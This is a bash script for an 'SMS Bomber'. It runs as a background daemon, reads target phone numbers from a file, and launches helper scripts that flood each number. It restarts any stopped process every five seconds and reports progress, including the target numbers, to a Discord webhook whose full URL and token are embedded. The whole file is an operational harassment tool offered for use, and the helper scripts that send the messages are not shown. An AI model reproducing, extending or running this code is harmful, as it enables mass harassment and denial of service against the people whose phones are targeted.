#!/bin/bash

script_dir="$(dirname "$0")"
numbers_file="$script_dir/active_numbers.txt"
webhook_url="https://discord.com/api/webhooks/1310304175661387877/PbZwMD80C-00Tjyy3PN1gt9jpKTGfPjFCOK05bXEDWCYWADpGJRsxuy6nVRtloXHuNIX"

# Function to send Discord webhook
send_webhook() {
    local message="$1"
    curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"$message\"}" "$webhook_url" 2>/dev/null
}

# Function to start bombing for a single number
start_bombing() {
    local number="$1"
    local temp_dir="$script_dir/temp_$number"
    mkdir -p "$temp_dir"
    
    # Process api1.sh (PRIMARY SERVER)
    if [ -f "$script_dir/api1.sh" ]; then
        cp "$script_dir/api1.sh" "$temp_dir/api1_$number.sh"
        sed -i 's/\r$//' "$temp_dir/api1_$number.sh"
        sed -i "s/€tor/$number/g" "$temp_dir/api1_$number.sh"
        bash "$temp_dir/api1_$number.sh" &
        send_webhook "🚀 Started PRIMARY SERVER bombing for: $number"
    fi
    
    # Process api.sh (BACKUP SERVER)
    if [ -f "$script_dir/api.sh" ]; then
        cp "$script_dir/api.sh" "$temp_dir/api_$number.sh"
        sed -i 's/\r$//' "$temp_dir/api_$number.sh"
        sed -i "s/€tor/$number/g" "$temp_dir/api_$number.sh"
        bash "$temp_dir/api_$number.sh" &
        send_webhook "🚀 Started BACKUP SERVER bombing for: $number"
    fi
    
    # Process new_api.sh (NEW SERVER)
    if [ -f "$script_dir/new_api.sh" ]; then
        cp "$script_dir/new_api.sh" "$temp_dir/new_api_$number.sh"
        sed -i 's/\r$//' "$temp_dir/new_api_$number.sh"
        sed -i "s/€tor/$number/g" "$temp_dir/new_api_$number.sh"
        bash "$temp_dir/new_api_$number.sh" &
        send_webhook "🚀 Started NEW SERVER bombing for: $number"
    fi
}

# Start the script as a daemon
(
    # Redirect stdout and stderr to logfile
    exec 1> >(logger -s -t $(basename $0)) 2>&1
    
    send_webhook "🔥 Starting SMS Bomber..."
    send_webhook "📱 Target Numbers: $(cat "$numbers_file" | tr '\n' ' ')"
    
    # Start bombing for each number
    while IFS= read -r number; do
        send_webhook "⚡ Initializing bomber for: $number"
        start_bombing "$number"
    done < "$numbers_file"
    
    # Monitor and restart processes
    while true; do
        while IFS= read -r number; do
            if [ -d "$script_dir/temp_$number" ]; then
                # Check if any bombing process is running for this number
                if ! pgrep -f "temp_$number" >/dev/null; then
                    send_webhook "🔄 Restarting bomber for: $number"
                    start_bombing "$number"
                fi
            fi
        done < "$numbers_file"
        sleep 5
    done
) </dev/null >/dev/null 2>&1 &

# Save the daemon's PID
echo $! > "$script_dir/bomber.pid"
send_webhook "✅ SMS Bomber daemon started successfully! PID: $(cat $script_dir/bomber.pid)"
